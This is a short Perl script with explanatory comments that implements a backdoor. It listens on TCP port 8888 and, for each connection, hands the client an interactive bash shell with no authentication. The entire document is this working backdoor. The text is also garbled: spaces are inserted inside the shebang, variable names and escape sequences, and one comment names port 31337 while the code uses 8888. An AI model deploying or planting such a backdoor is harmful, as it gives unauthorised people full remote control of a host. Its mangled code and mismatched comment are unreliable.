#! / usr / bin / perl
$ SHELL = "/ bin / bash -i"; ## Let's use interactive bash as our shell
$ LISTEN_PORT = "8888"; ## Selecting port 31337 for the backdoor
use Socket; ## Using the Socket module
$ protocol = getprotobyname ('tcp'); ### Protocol - TCP

socket (S, & PF_INET, & SOCK_STREAM, $ protocol) || die "Cant create socket \ n"; ### Trying to create a socket descriptor or terminating the script with an error message.
setsockopt (S, SOL_SOCKET, SO_REUSEADDR, 1); ## Make the socket support REUSE - port reusability
bind (S, sockaddr_in ($ LISTEN_PORT, INADDR_ANY)) || die "Cant open port \ n"; ## Bind the port to all machine addresses or report an error
listen (S, 3) || die "Cant listen port \ n"; ## We are waiting for connections to the port

while (1) {

accept (CONN, S); ## When connecting, create a descriptor named CONN

if (! ($ pid = fork)) ## Make a child process for a connection with the CONN descriptor


{


die "Cannot fork" if (! defined $ pid); ## If the branch fails, exit

open STDIN, "<& CONN";

open STDOUT, "> & CONN";

open STDERR, "> & CONN"; ## Redirecting STDIN, STDOUT and STDERR to the client terminal

exec $ SHELL || die print CONN "Cant execute $ SHELL \ n"; ## We are trying to start an interactive shell or, in case of failure, we end the script

close CONN; ## Closing the socket after the shell is finished

exit 0; ## Exit correctly by terminating the child.

}

}
